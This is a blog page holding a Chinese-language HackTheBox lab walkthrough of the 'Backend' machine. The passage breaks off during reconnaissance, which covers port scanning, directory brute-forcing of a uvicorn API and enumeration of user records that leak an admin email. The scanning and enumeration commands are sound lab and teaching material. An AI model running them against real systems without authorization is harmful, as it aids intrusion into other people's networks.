@@ -1,0 +1,711 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.161[sudo] crazyinsid">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Backend">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Backend.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.161[sudo] crazyinsid">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Backend.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200134823.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200316188.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200420516.png">
+<meta property="article:published_time" content="2023-08-13T22:39:08.977Z">
+<meta property="article:modified_time" content="2023-08-11T16:42:22.496Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Backend.png">
+  
+  
+  
+  <title>HTB Walkthrough - Backend - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Backend"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          21k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          179 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Backend</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Backend.png" srcset="/img/loading.gif" lazyload alt="Backend"></p>
+<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.161</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-27 10:30:15 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.161                                    </span><br><span class="line">Discovered open port 80/tcp on 10.10.11.161   </span><br><span class="line">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.11.161 -p80                              </span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-27 18:32 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.161</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    uvicorn</span><br><span class="line">|_http-server-header: uvicorn</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (application/json).</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Bad Request</span></span><br><span class="line"><span class="string">|     content-type: text/plain; charset=utf-8</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     Invalid HTTP request received.</span></span><br><span class="line"><span class="string">|   FourOhFourRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 404 Not Found</span></span><br><span class="line"><span class="string">|     date: Sat, 27 Aug 2022 14:43:52 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 22</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &#123;&quot;detail&quot;:&quot;Not Found&quot;&#125;</span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     date: Sat, 27 Aug 2022 14:43:40 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 29</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &#123;&quot;msg&quot;:&quot;UHC API Version 1.0&quot;&#125;</span></span><br><span class="line"><span class="string">|   HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     date: Sat, 27 Aug 2022 14:43:46 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 31</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|_    &#123;&quot;detail&quot;:&quot;Method Not Allowed&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 69.88 seconds</span></span><br><span class="line"><span class="string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.161 -p80</span></span><br></pre></td></tr></table></figure>
+
+<p>不熟。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ dirsearch -u http://backend.htb/ </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/crazyinside/.dirsearch/reports/backend.htb/-_22-08-27_18-35-34.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-27_18-35-34.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://backend.htb/</span><br><span class="line"></span><br><span class="line">[18:35:35] Starting: </span><br><span class="line">[18:36:19] 200 -   20B  - /api</span><br><span class="line">[18:36:19] 200 -   30B  - /api/v1</span><br><span class="line">[18:36:19] 307 -    0B  - /api/  -&gt;  http://backend.htb/api</span><br><span class="line">[18:36:36] 401 -   30B  - /docs</span><br><span class="line">[18:36:36] 307 -    0B  - /docs/  -&gt;  http://backend.htb/docs</span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line">                                                                                                                                       </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -I http://backend.htb/api                                                                          </span><br><span class="line">HTTP/1.1 405 Method Not Allowed</span><br><span class="line"><span class="built_in">date</span>: Sat, 27 Aug 2022 14:47:38 GMT</span><br><span class="line">server: uvicorn</span><br><span class="line">content-length: 31</span><br><span class="line">content-type: application/json</span><br><span class="line"></span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X POST</span><br><span class="line">HTTP/1.1 405 Method Not Allowed</span><br><span class="line"><span class="built_in">date</span>: Sat, 27 Aug 2022 14:47:47 GMT</span><br><span class="line">server: uvicorn</span><br><span class="line">content-length: 31</span><br><span class="line">content-type: application/json</span><br><span class="line"></span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X HEAD</span><br><span class="line">HTTP/1.1 405 Method Not Allowed</span><br><span class="line"><span class="built_in">date</span>: Sat, 27 Aug 2022 14:47:53 GMT</span><br><span class="line">server: uvicorn</span><br><span class="line">content-length: 31</span><br><span class="line">content-type: application/json</span><br><span class="line"></span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X GET </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="built_in">date</span>: Sat, 27 Aug 2022 14:47:57 GMT</span><br><span class="line">server: uvicorn</span><br><span class="line">content-length: 20</span><br><span class="line">content-type: application/json</span><br><span class="line"></span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api        </span><br><span class="line">&#123;<span class="string">&quot;endpoints&quot;</span>:[<span class="string">&quot;v1&quot;</span>]&#125;                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/docs</span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1</span><br><span class="line">&#123;<span class="string">&quot;endpoints&quot;</span>:[<span class="string">&quot;user&quot;</span>,<span class="string">&quot;admin&quot;</span>]&#125;                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user</span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Not Found&quot;</span>&#125;                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/admin</span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/admin -I</span><br><span class="line">HTTP/1.1 307 Temporary Redirect</span><br><span class="line"><span class="built_in">date</span>: Sat, 27 Aug 2022 14:50:59 GMT</span><br><span class="line">server: uvicorn</span><br><span class="line">location: http://backend.htb/api/v1/admin/</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">                                                                                                                                        </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<p>说不定admin下会有什么东西：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/admin -e                              </span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://backend.htb/api/v1/admin</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">307      GET        0l        0w        0c http://backend.htb/api/v1/admin =&gt; http://backend.htb/api/v1/admin/</span><br><span class="line">405      GET        1l        3w       31c http://backend.htb/api/v1/admin/file</span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   0s      found:2       errors:0      </span></span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   229/s   http://backend.htb/api/v1/admin </span></span><br></pre></td></tr></table></figure>
+
+<p>有，但暂时没什么用。用户目录下有很多：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/user -e </span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://backend.htb/api/v1/user</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/2010</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/404</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/2009</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/2011</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/2008</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/2007</span><br><span class="line">200      GET        1l        1w      141c http://backend.htb/api/v1/user/1</span><br><span class="line">200      GET        1l        1w        4c http://backend.htb/api/v1/user/9</span><br><span class="line">...............................</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user/1  </span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@htb.local&quot;</span>,<span class="string">&quot;date&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1649533388111,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125; </span><br></pre></td></tr></table></figure>
+
+<p>敏感信息泄露。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user/2007</span><br><span class="line">null     </span><br></pre></td></tr></table></figure>
+
+<p>可以快速生成一个1-10000的数字列表，而且似乎没必要考虑01,001等：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/01                                                                 </span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@htb.local&quot;</span>,<span class="string">&quot;date&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1649533388111,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/1 </span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@htb.local&quot;</span>,<span class="string">&quot;date&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1649533388111,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/001</span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@htb.local&quot;</span>,<span class="string">&quot;date&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1649533388111,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/0001</span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@htb.local&quot;</span>,<span class="string">&quot;date&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1649533388111,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125; </span><br></pre></td></tr></table></figure>
+
+<p>没跑出来啥。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/user -e -m GET,POST -C 404,405,422</span><br><span class="line">422     POST        1l        3w      172c http://10.10.11.161/api/v1/user/login</span><br><span class="line">200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/1</span><br><span class="line">200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/2</span><br><span class="line">200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/3</span><br><span class="line">422     POST        1l        2w       81c http://10.10.11.161/api/v1/user/signup  </span><br><span class="line">200      GET        1l        1w      139c 